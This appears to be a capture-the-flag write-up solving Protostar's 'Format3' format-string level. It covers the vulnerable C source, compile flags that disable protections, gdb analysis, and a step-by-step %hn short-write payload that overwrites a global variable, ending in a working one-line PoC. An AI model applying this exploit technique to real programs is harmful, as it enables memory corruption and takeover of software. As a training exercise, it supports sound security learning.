## Protostar-Format3 Solution

### 1. Introduction

This is a poc solution for the "Format3" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.

Source:
[https://web.archive.org/web/20170417130413/https://exploit-exercises.com/protostar/format3/](https://web.archive.org/web/20170417130413/https://exploit-exercises.com/protostar/format3/) 
 
**Hints:**
* This level advances from format2 and shows how to write more than 1 or 2 bytes of memory to the process.
* This also teaches you to carefully control what data is being written to the process memory.

#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o format_3 format_3.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb-peda

```nasm
gdb-peda$ disas vuln
Dump of assembler code for function vuln:
   0x080484b0 <+0>:	push   ebp
   0x080484b1 <+1>:	mov    ebp,esp
   0x080484b3 <+3>:	sub    esp,0x218
   0x080484b9 <+9>:	mov    eax,ds:0x804a028
   0x080484be <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484c2 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484ca <+26>:	lea    eax,[ebp-0x208]
   0x080484d0 <+32>:	mov    DWORD PTR [esp],eax
   0x080484d3 <+35>:	call   0x8048360 <fgets@plt>
   0x080484d8 <+40>:	lea    eax,[ebp-0x208]
   0x080484de <+46>:	mov    DWORD PTR [esp],eax
   0x080484e1 <+49>:	call   0x804849d <printbuffer>
   0x080484e6 <+54>:	mov    eax,ds:0x804a030
   0x080484eb <+59>:	cmp    eax,0x1025544
   0x080484f0 <+64>:	jne    0x8048500 <vuln+80>
   0x080484f2 <+66>:	mov    DWORD PTR [esp],0x80485c0
   0x080484f9 <+73>:	call   0x8048370 <puts@plt>
   0x080484fe <+78>:	jmp    0x8048515 <vuln+101>
   0x08048500 <+80>:	mov    eax,ds:0x804a030
   0x08048505 <+85>:	mov    DWORD PTR [esp+0x4],eax
   0x08048509 <+89>:	mov    DWORD PTR [esp],0x80485e0
   0x08048510 <+96>:	call   0x8048350 <printf@plt>
   0x08048515 <+101>:	leave  
   0x08048516 <+102>:	ret    
End of assembler dump.

$ objdump -t format_3 | grep target
0804a030 g     O .bss	00000004              target
```

It's similar to previous one but this time we need to write a value **(0x1025544)** onto target variable.

```nasm
0x080484e6 <+54>:	mov    eax,ds:0x804a030
0x080484eb <+59>:	cmp    eax,0x1025544
```

#### 2.2 Quick Solution

Let's by calculating the offset between the parameters of printf and the string when it's called.

```nasm
gdb-peda$ disas printbuffer
Dump of assembler code for function printbuffer:
   0x0804849d <+0>:	push   ebp
   0x0804849e <+1>:	mov    ebp,esp
   0x080484a0 <+3>:	sub    esp,0x18
   0x080484a3 <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x080484a6 <+9>:	mov    DWORD PTR [esp],eax
   0x080484a9 <+12>:	call   0x8048350 <printf@plt>
   0x080484ae <+17>:	leave  
   0x080484af <+18>:	ret

gdb-peda$ b*0x080484a9
Breakpoint 4 at 0x80484a9: file format_3.c, line 10.

gdb-peda$ r
Starting program: format_3 
AAAA

gdb-peda$ x/wx $esp
0xffffced0:	0xffffcf00

gdb-peda$ p/d (0xffffcf00 - 0xffffced0) / 4
$15 = 12
```

Okay it's 12, it's possible to validate by select 12th argument via **$** as well.

```
$ ./format_3
AAAA%12$x                     
AAAA41414141
target is 00000000 :(
```

There are several methods such as writing one byte each time but I'd like to use short writes method.
This method (short int types: the '%hn') helps to write an address in just two writes.

The following quote is from a pdf which was published after a CCC talk.
[https://koeln.ccc.de/archiv/congress/17c3-2000/formatstring/shortwrite.html](https://koeln.ccc.de/archiv/congress/17c3-2000/formatstring/shortwrite.html)
[https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf](https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf)

> The ‘h’ can be used in other format parameters too, to cast the value supplied on the stack to a short type. The short write technique has
one advantage over the first technique: It does not destroy data beside the address, so if there is valueable data behind the address you are overwriting, such as a function parameter, it is preserved.  This does not work on old GNU C libraries (libc5). Also it consumes more memory in the target process.


Target address: **0804a030**
Target value: **0x1025544**

Let's split **0x1025544** into **0x0102** and **0x5544**.

0x0102 in decimal: **258** 
0x5544 in decimal: **21828**

So we will write the following:

1. **21828** to **0804a030**
2. **258** to **0804a032**

So let's structure our payload step by step.

1. Target address and address+2: 
    
    **"\x32\xa0\x04\x08\x30\xa0\x04\x08"**

2. We need to write on to target but %n gets number of bytes before it. So, let's pad 250 times (**%250d**) **258-8= 250**:

    **"\x32\xa0\x04\x08\x30\xa0\x04\x08%250d"**

3. Our buffer starts in the offset 12.

    **"\x32\xa0\x04\x08\x30\xa0\x04\x08%250d%12$hn"**

4. Then we need to overwrite second half of our target address. So, padding will be: **21828 - 258 = 21570**:

    **"\x32\xa0\x04\x08\x30\xa0\x04\x08%250d%12$hn%21570d"**
 
5. Just next to our first half of the payload is 13. By using direct access (**$**) short int write:

    **"\x32\xa0\x04\x08\x30\xa0\x04\x08%250d%12$hn%21570d%13$hn"**


Let's check if it works out or not:

```nasm
gdb-peda$ b*0x080484a9
Breakpoint 1 at 0x80484a9: file format_3.c, line 10.

gdb-peda$ r <<< $(python -c 'print "\x32\xa0\x04\x08\x30\xa0\x04\x08%250d%12$hn%21570d%13$hn"')
...TRIM...

gdb-peda$ b*0x80484ae
Breakpoint 2 at 0x80484ae: file format_3.c, line 11.

gdb-peda$ c
Continuing.

gdb-peda$ disas 
Dump of assembler code for function printbuffer:
   0x0804849d <+0>:	push   ebp
   0x0804849e <+1>:	mov    ebp,esp
   0x080484a0 <+3>:	sub    esp,0x18
   0x080484a3 <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x080484a6 <+9>:	mov    DWORD PTR [esp],eax
   0x080484a9 <+12>:	call   0x8048350 <printf@plt>
=> 0x080484ae <+17>:	leave  
   0x080484af <+18>:	ret    
End of assembler dump.

gdb-peda$ print target
$3 = 0x1025544
```
As seen above, **target** variable is overwritten with our target value (**0x1025544**).

#### 2.3 Final PoC

```
python -c 'print "\x32\xa0\x04\x08\x30\xa0\x04\x08%250d%12$hn%21570d%13$hn"' | ./format_3

2�0�                                                                                                                                                                                                                                                -134281632                                                                                                                                                                                                                                                                                                                                  -11900
you have modified the target :)
```
